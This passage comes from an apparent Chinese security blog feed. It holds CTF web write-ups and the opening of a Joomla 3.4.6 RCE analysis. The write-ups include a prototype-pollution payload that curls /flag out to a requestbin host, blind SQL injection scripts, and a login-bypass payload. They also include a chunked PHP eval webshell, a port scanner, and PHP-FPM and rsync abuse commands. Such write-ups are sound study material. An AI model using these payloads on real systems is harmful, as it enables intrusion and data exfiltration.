class="keyword">this</span>.num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.note_list = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        <span class="keyword">this</span>.note_list[(<span class="keyword">this</span>.num++).toString()] = &#123;<span class="string">"author"</span>: author,<span class="string">"raw_note"</span>:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(<span class="keyword">this</span>.note_list, id));</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">        undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="keyword">this</span>.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> notes = <span class="keyword">new</span> Notes();</span><br><span class="line">notes.write_note(<span class="string">"nobody"</span>, <span class="string">"this is nobody's first note"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname, <span class="string">'views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'pug'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, <span class="string">'public'</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.render(<span class="string">'index'</span>, &#123; <span class="attr">title</span>: <span class="string">'Notebook'</span> &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/add_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">'please use POST to add a note'</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> raw = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"add note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"did not add note"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/edit_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to edit a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">let</span> author = req.body.author;</span><br><span class="line">        <span class="keyword">let</span> enote = req.body.raw;</span><br><span class="line">        <span class="keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note sucess"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"edit note failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/delete_note'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"please use POST to delete a note"</span>&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> id = req.body.id;</span><br><span class="line">        <span class="keyword">if</span> (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete done"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.render(<span class="string">'mess'</span>, &#123;<span class="attr">message</span>: <span class="string">"delete failed"</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/notes'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> q = req.query.q;</span><br><span class="line">        <span class="keyword">let</span> a_note;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span>(q) === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(<span class="string">'note'</span>, &#123;<span class="attr">list</span>: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(<span class="string">'/status'</span>)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> commands = &#123;</span><br><span class="line">            <span class="string">"script-1"</span>: <span class="string">"uptime"</span>,</span><br><span class="line">            <span class="string">"script-2"</span>: <span class="string">"free -m"</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;<span class="attr">shell</span>:<span class="string">'/bin/bash'</span>&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(<span class="string">'OK'</span>);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).send(<span class="string">'Sorry cant find that!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">err, req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(err.stack);</span><br><span class="line">  res.status(<span class="number">500</span>).send(<span class="string">'Something broke!'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">app.listen(port, () =&gt; <span class="built_in">console</span>.log(<span class="string">`Example app listening at http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><p>参考如下文章<a href="https://www.4hou.com/index.php/posts/Zppg" target="_blank" rel="noopener">https://www.4hou.com/index.php/posts/Zppg</a></p><p>在/edit_note处存在原型链污染利用点，在/status路由下存在命令执行利用点，操作如下</p><p>首先污染原型</p><p><img src="/2019/12/30/积累的一些web题目/42.jpg" alt="42"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"id"</span>:<span class="string">"__proto__"</span>,<span class="attr">"author"</span>:<span class="string">"curl -X POST -d \"fizz=`cat /flag`\" http://http.requestbin.buuoj.cn/1hrdjp81"</span>,<span class="attr">"raw"</span>:<span class="string">"aaa"</span>&#125;</span><br></pre></td></tr></table></figure><p>然后访问/status路由</p><p><img src="/2019/12/30/积累的一些web题目/43.jpg" alt="43"></p><p>会执行curl命令，拿到flag</p><p><img src="/2019/12/30/积累的一些web题目/44.jpg" alt="44"></p><h2 id="HarekazeCTF2019-Sqlite-Voting"><a href="#HarekazeCTF2019-Sqlite-Voting" class="headerlink" title="[HarekazeCTF2019]Sqlite Voting"></a>[HarekazeCTF2019]Sqlite Voting</h2><blockquote><p>考点:sqlite注入绕过</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/45.jpg" alt="45"></p><p>源码</p><p><img src="/2019/12/30/积累的一些web题目/46.jpg" alt="46"></p><p>此处id是注入点，但是过滤了常规的注入函数。这里可使用replace进行长度的替换来进行盲注</p><p>用下面的测试来说明问题</p><p><img src="/2019/12/30/积累的一些web题目/47.jpg" alt="47"></p><p>这样通过逐位爆破就可以拿到flag</p><p>在本题中过滤了单引号，空格等特殊字符串，可以使用括号分割的方式来代替空格，然后使用双hex将flag转换为只有0-9的数字，但是replace替换只能替换完整的数字，我们可以使用||来将数字转换为字符串，测试如图</p><p><img src="/2019/12/30/积累的一些web题目/48.jpg" alt="48"></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://50f65f15-fd2f-4898-8a74-9f812aff59f4.node3.buuoj.cn/vote.php"</span></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    print(<span class="string">"========================================================"</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment">#爆破flag长度</span></span><br><span class="line">        <span class="comment"># payload = f"abs(case(replace(length(hex(hex((select(flag)from(flag))))),&#123;i&#125;,trim(0,0)))when(trim(0,0))then(0x100)else(0x8000000000000000)end)"</span></span><br><span class="line">        temp = result+<span class="string">"||"</span>+str(j)</span><br><span class="line">        len1 = <span class="number">109</span>-i</span><br><span class="line">        payload = <span class="string">f"abs(case(length(replace(hex(hex((select(flag)from(flag)))),3||6||3||6||3||6||4||3||3||6||3||1||3||6||3||7||3||7||4||2||3||3||3||7||3||6||3||5||3||6||3||4||3||3||3||7||3||3||3||2||3||3||3||9||3||6||3||5||3||3||3||9||3||2||4||4||3||3||3<span class="subst">&#123;temp&#125;</span>,trim(0,0))))when(<span class="subst">&#123;len1&#125;</span>)then(0x100)else(0x8000000000000000)end)"</span></span><br><span class="line">        data = &#123;<span class="string">"id"</span>:payload&#125;</span><br><span class="line">        print(len1,payload)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            html = s.post(url,data=data)</span><br><span class="line">            <span class="comment"># print(html.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"Thank you"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">                result = temp</span><br><span class="line">                print(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="PwnThyBytes-2019-Baby-SQL"><a href="#PwnThyBytes-2019-Baby-SQL" class="headerlink" title="[PwnThyBytes 2019]Baby_SQL"></a>[PwnThyBytes 2019]Baby_SQL</h2><blockquote><p>考点：sql注入，session触发</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/49.jpg" alt="49"></p><p>查看源码，<code>index.php</code></p><p><img src="/2019/12/30/积累的一些web题目/51.jpg" alt="51"></p><p>过滤了传入进来的数据，接着看<code>login.php</code></p><p><img src="/2019/12/30/积累的一些web题目/50.jpg" alt="50"></p><p>对于传入的参数没有任何过滤，但是存在着<code>session</code>校验，直接访问是会<code>die</code>的</p><p>查到如下资料</p><p><img src="/2019/12/30/积累的一些web题目/52.jpg" alt="52"></p><p>那么我们可以这样来绕过<code>session</code>校验</p><p><img src="/2019/12/30/积累的一些web题目/53.jpg" alt="53"></p><p>然后就是正常的<code>sql</code>注入，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">dicts = <span class="string">"1234567890qwertyuiopasdfghjklzxcvbnm_,.-=&#123;&#125;QWERTYUIOPASDFGHJKLZXCVBNM:?#@!$%^&amp;*()"</span></span><br><span class="line">results = <span class="string">""</span></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"http://c911afa2-0281-44d1-8053-97a57aaeb3e6.node3.buuoj.cn/templates/login.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    print(<span class="string">"==================================="</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dicts:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        ass = ord(j)</span><br><span class="line">        <span class="comment"># payload = f"""?username=ad"%20or%20if((ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),&#123;i&#125;,1))=&#123;ass&#125;),0,1)%23&amp;password=1234567890"""</span></span><br><span class="line">        <span class="comment"># payload = f"""?username=ad"%20or%20if((ascii(substr((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='flag_tbl'),&#123;i&#125;,1))=&#123;ass&#125;),0,1)%23&amp;password=1234567890"""</span></span><br><span class="line">        payload = <span class="string">f"""?username=ad"%20or%20if((ascii(substr((select%20secret%20from%20flag_tbl),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;ass&#125;</span>),0,1)%23&amp;password=1234567890"""</span></span><br><span class="line">        cookies = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"b682f0720ec20073b57edf45e2041840"</span>&#125;</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        html = s.post(url=url+payload,cookies=cookies,files=&#123;<span class="string">"file"</span>:<span class="string">"666"</span>&#125;,data=&#123;<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="number">122</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Try"</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            results = results+j</span><br><span class="line">            print(results)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h2><blockquote><p>考点：require_once小缺陷</p></blockquote><p>题目如图</p><p><img src="/2019/12/30/积累的一些web题目/54.jpg" alt="54"></p><p><code>require_once</code>执行过后，继续使用该函数包含同一个文件不会再次包含，这里可以使用require软链接的小缺陷</p><p>尝试如下方式读取<code>flag.php</code> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/var/</span>www<span class="regexp">/html/</span>flag.php</span><br></pre></td></tr></table></figure><p>还可以使用如下方法</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/hello/</span>..<span class="regexp">/proc/</span>self<span class="regexp">/cwd/</span>flag.php</span><br></pre></td></tr></table></figure><h2 id="Black-Watch-入群题-Web2"><a href="#Black-Watch-入群题-Web2" class="headerlink" title="[Black Watch 入群题]Web2"></a>[Black Watch 入群题]Web2</h2><blockquote><p>考点：rollup注入，mysql任意文件读取</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/55.jpg" alt="55"></p><p>登陆处过滤了<code>or &#39;  and</code> 等，可使用<code>group by with rollup</code>，可将<code>username</code>的单引号转义掉，<code>payload</code>如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">username</span>=\&amp;password=||1<span class="built_in"> group </span>by token with rollup having token is NULL--+&amp;<span class="attribute">question</span>=1</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/56.jpg" alt="56"></p><p>成功登陆后台，在查看数据处可使用<code>00</code>截断来进行目录穿越列目录</p><p><img src="/2019/12/30/积累的一些web题目/57.jpg" alt="57"></p><p>可以拿到<code>flag</code>文件名，接着利用题目中的数据备份功能，配合mysql客户端任意文件读取漏洞读取<code>flag</code>，参考如下文章</p><p><a href="https://blog.csdn.net/qq_41107295/article/details/100743094" target="_blank" rel="noopener">https://blog.csdn.net/qq_41107295/article/details/100743094</a></p><p>工具下载地址</p><p><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server</a></p><p><img src="/2019/12/30/积累的一些web题目/58.jpg" alt="58"></p><h2 id="2018-web-virink-web"><a href="#2018-web-virink-web" class="headerlink" title="2018_web_virink_web"></a>2018_web_virink_web</h2><blockquote><p>考点：限制字符数量写shell，PHP-FPM未授权访问漏洞，rsync未授权访问漏洞</p></blockquote><p>题目界面</p><p><img src="/2019/12/30/积累的一些web题目/59.jpg" alt="59"></p><p>限制了 命令执行的长度长度，可分块写入<code>shell</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;?php'</span>&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'eva'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'l($'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'_PO'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'ST['</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">'c])'</span>&gt;&gt;<span class="number">1.</span>php</span><br><span class="line"><span class="keyword">echo</span> -n <span class="string">';'</span>&gt;&gt;<span class="number">1.</span>php</span><br></pre></td></tr></table></figure><p>写入后发现存在内网服务，使用如下脚本探测端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'active_port.txt'</span>,<span class="string">'at'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65535</span>+<span class="number">1</span>):</span><br><span class="line">            ip = <span class="string">'10.21.125.10'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure><p>存在<code>9000</code>和<code>873</code>端口</p><p>9000端口存在PHP-FPM未授权访问漏洞，参考如下文章</p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>脚本如下</p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fpm<span class="selector-class">.py</span> <span class="number">10.21</span>.<span class="number">125.10</span> /www/redirect<span class="selector-class">.php</span> -c <span class="string">"&lt;?php system(\'ls /\');?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/60.jpg" alt="60"></p><p>可以拿到flag文件名但是无权限读取，在这里可利用<code>rsync</code>未授权访问漏洞将<code>flag</code>拷贝到<code>/tmp/</code>目录下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>::src/<span class="number">7</span>h1s_i5_f14g /tmp/</span><br></pre></td></tr></table></figure><p><img src="/2019/12/30/积累的一些web题目/61.jpg" alt="61"></p><p>读取<code>flag</code></p><p><img src="/2019/12/30/积累的一些web题目/62.jpg" alt="62"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GXYCTF2019-BabySQli&quot;&gt;&lt;a href=&quot;#GXYCTF2019-BabySQli&quot; class=&quot;headerlink&quot; title=&quot;[GXYCTF2019]BabySQli&quot;&gt;&lt;/a&gt;[GXYCTF2019]BabySQli&lt;/h2&gt;&lt;bl
      
    
    </summary>
    
    
    
      <category term="CTF" scheme="https://yml-sec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>joomla3.4.6-rce分析</title>
    <link href="https://yml-sec.top/2019/10/15/joomla3-4-6-rce%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2019/10/15/joomla3-4-6-rce%E5%88%86%E6%9E%90/</id>
    <published>2019-10-15T13:50:51.000Z</published>
    <updated>2019-10-23T14:18:32.249Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间意大利安全研究员Alessandro Groppo 公开了joomla3.0.0-3.4.6的漏洞详情，今天借此机会复现分析一下</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>漏洞根本上来说是源于session的反序列化，在joomla中有一套自己的session处理机制，当产生会话的时候，joomla会将序列化后的数据存储在数据库中，然后将数据从数据库中取出来进行反序列化</p><p>写函数: <code>\libraries\joomla\session\storage\database.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Write session data to the SessionHandler backend.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string  $id    The session identifier.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>   string  $data  The session data.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  boolean  True on success, false otherwise.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   11.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($id, $data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Get the database connection object and verify its connected.</span></span><br><span class="line">$db = JFactory::getDbo();</span><br><span class="line"></span><br><span class="line">$data = str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">$query = $db-&gt;getQuery(<span class="keyword">true</span>)</span><br><span class="line">-&gt;update($db-&gt;quoteName(<span class="string">'#__session'</span>))</span><br><span class="line">-&gt;set($db-&gt;quoteName(<span class="string">'data'</span>) . <span class="string">' = '</span> . $db-&gt;quote($data))</span><br><span class="line">-&gt;set($db-&gt;quoteName(<span class="string">'time'</span>) . <span class="string">' = '</span> . $db-&gt;quote((int) time()))</span><br><span class="line">-&gt;where($db-&gt;quoteName(<span class="string">'session_id'</span>) . <span class="string">' = '</span> . $db-&gt;quote($id));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Try to update the session data in the database table.</span></span><br><span class="line">$db-&gt;setQuery($query);</span><br><span class="line"></span><br><span 